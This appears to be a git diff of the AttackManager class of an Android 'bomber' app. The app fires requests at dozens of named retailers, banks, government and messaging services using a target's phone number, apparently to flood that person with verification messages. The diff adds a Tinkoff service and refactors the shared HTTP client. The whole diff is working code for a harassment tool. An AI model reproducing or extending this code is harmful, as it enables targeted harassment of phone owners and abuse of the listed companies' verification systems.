@@ -11,20 +11,28 @@ import com.dm.bomber.services.Eldorado;
 import com.dm.bomber.services.Farfor;
 import com.dm.bomber.services.Fivepost;
 import com.dm.bomber.services.GloriaJeans;
+import com.dm.bomber.services.Gorparkovka;
+import com.dm.bomber.services.Gosuslugi;
+import com.dm.bomber.services.GreenBee;
+import com.dm.bomber.services.Hoff;
 import com.dm.bomber.services.ICQ;
 import com.dm.bomber.services.Kari;
 import com.dm.bomber.services.Lenta;
 import com.dm.bomber.services.MTS;
 import com.dm.bomber.services.Mcdonalds;
+import com.dm.bomber.services.MegafonBank;
 import com.dm.bomber.services.MegafonTV;
 import com.dm.bomber.services.Modulebank;
 import com.dm.bomber.services.Multiplex;
+import com.dm.bomber.services.N1RU;
 import com.dm.bomber.services.OK;
 import com.dm.bomber.services.Olltv;
+import com.dm.bomber.services.Premier;
 import com.dm.bomber.services.ProstoTV;
 import com.dm.bomber.services.Pyaterochka;
 import com.dm.bomber.services.RendezVous;
 import com.dm.bomber.services.Robocredit;
+import com.dm.bomber.services.Samokat;
 import com.dm.bomber.services.Sephora;
 import com.dm.bomber.services.Service;
 import com.dm.bomber.services.Sravni;
@@ -32,24 +40,17 @@ import com.dm.bomber.services.SushiWok;
 import com.dm.bomber.services.Tele2;
 import com.dm.bomber.services.Tele2TV;
 import com.dm.bomber.services.Telegram;
+import com.dm.bomber.services.Tinder;
+import com.dm.bomber.services.Tinkoff;
+import com.dm.bomber.services.ToGO;
 import com.dm.bomber.services.Ukrzoloto;
+import com.dm.bomber.services.VoprosRU;
 import com.dm.bomber.services.Wink;
+import com.dm.bomber.services.Yandex;
 import com.dm.bomber.services.YandexEda;
 import com.dm.bomber.services.YotaTV;
 import com.dm.bomber.services.Zdravcity;
-import com.dm.bomber.services.Yandex;
-import com.dm.bomber.services.MegafonBank;
-import com.dm.bomber.services.VoprosRU;
 import com.dm.bomber.services.inDriver;
-import com.dm.bomber.services.Tinder;
-import com.dm.bomber.services.Gosuslugi;
-import com.dm.bomber.services.N1RU;
-import com.dm.bomber.services.Hoff;
-import com.dm.bomber.services.Samokat;
-import com.dm.bomber.services.GreenBee;
-import com.dm.bomber.services.ToGO;
-import com.dm.bomber.services.Premier;
-import com.dm.bomber.services.Gorparkovka;
 
 import org.jetbrains.annotations.NotNull;
 
@@ -66,14 +67,13 @@ import okhttp3.Response;
 public class AttackManager {
     private static final String TAG = "AttackManager";
 
-    private final OkHttpClient client;
     private final Service[] services;
 
     private Attack attack;
     private final Callback callback;
 
     public AttackManager(Callback callback) {
-        this.client = new OkHttpClient.Builder()
+        Service.client = new OkHttpClient.Builder()
                 .connectTimeout(10, TimeUnit.SECONDS)
                 .readTimeout(10, TimeUnit.SECONDS)
                 .build();
@@ -91,7 +91,7 @@ public class AttackManager {
                 new Zdravcity(), new Robocredit(), new Yandex(), new MegafonBank(),
                 new VoprosRU(), new inDriver(), new Tinder(), new Gosuslugi(),
                 new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
-                new ToGO(), new Premier(), new Gorparkovka()
+                new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff()
         };
     }
 
@@ -106,7 +106,7 @@ public class AttackManager {
 
     public void stopAttack() {
         attack.interrupt();
-        client.dispatcher().cancelAll();
+        Service.client.dispatcher().cancelAll();
     }
 
     public List<Service> getUsableServices(String phoneCode) {
@@ -157,7 +157,7 @@ public class AttackManager {
                 for (Service service : usableServices) {
                     service.prepare(phoneCode, phone);
 
-                    client.newCall(service.run()).enqueue(new okhttp3.Callback() {
+                    service.run(new okhttp3.Callback() {
                         @Override
                         public void onFailure(@NotNull Call call, @NotNull IOException e) {
                             progress++;
